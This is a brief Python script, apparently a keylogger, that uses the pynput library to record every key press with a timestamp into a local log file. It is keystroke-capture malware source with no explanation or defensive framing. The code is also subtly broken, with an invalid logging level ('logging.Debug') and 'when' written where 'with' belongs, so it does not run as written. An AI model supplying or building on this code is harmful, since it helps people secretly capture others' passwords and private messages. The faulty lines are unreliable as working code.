import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir = r"C:/path/to/logger"
logging.basicConfig(filename = (log_dir + r"/keyLog.txt"), level=logging.Debug, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))


when Listener(on_press=on_press) as listener:
 listener.join()

